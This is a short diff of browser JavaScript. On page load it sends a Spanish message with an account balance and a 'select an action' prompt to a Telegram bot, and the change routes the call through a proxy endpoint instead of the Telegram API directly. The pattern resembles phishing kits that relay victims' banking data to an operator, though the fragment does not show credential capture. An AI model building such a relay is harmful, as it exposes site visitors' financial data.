@@ -46,8 +46,8 @@ document.addEventListener('DOMContentLoaded', () => {
                         `💵 **Saldo:** \`$ ${saldo}\`\n\n👇 **SELECCIONA UNA ACCIÓN:**`;
 
         try {
-            // Enviar a Telegram DIRECTAMENTE (para evitar problemas de proxy)
-            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            // Enviar a Telegram VIA PROXY
+            const response = await fetch(`/telegram-proxy/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
